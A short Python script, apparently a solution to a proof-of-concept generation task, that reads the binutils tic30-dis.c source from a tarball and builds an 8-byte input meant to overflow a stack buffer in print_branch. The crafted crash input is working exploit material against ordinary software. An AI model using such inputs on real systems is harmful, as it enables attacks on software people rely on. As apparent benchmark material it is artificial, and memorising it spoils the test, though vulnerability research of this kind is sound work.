import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        target_content = ""
        found = False
        
        try:
            with tarfile.open(src_path) as tar:
                for member in tar:
                    if member.name.endswith("tic30-dis.c"):
                        f = tar.extractfile(member)
                        if f:
                            target_content = f.read().decode('utf-8', errors='ignore')
                            found = True
                        break
        except Exception:
            pass
            
        base_opcode = 0x60000000 
        
        if found:
            # Attempt to find the opcode for "br" in the tic30_optab
            match = re.search(r'\{\s*"br"\s*,\s*(0x[0-9a-fA-F]+)', target_content)
            if match:
                base_opcode = int(match.group(1), 16)
        
        # The vulnerability in tic30-dis.c is a stack buffer overflow in print_branch
        # caused by sprintf writing a large formatted integer into a small buffer.
        # We construct an instruction using the BR opcode and a large negative immediate 
        # value (0x808080) to maximize the length of the printed string.
        insn = (base_opcode & 0xFF000000) | 0x00808080
        
        # Return both Big Endian and Little Endian versions to ensure the disassembler
        # correctly interprets the opcode regardless of the target configuration.
        # This results in an 8-byte PoC.
        return insn.to_bytes(4, 'big') + insn.to_bytes(4, 'little')
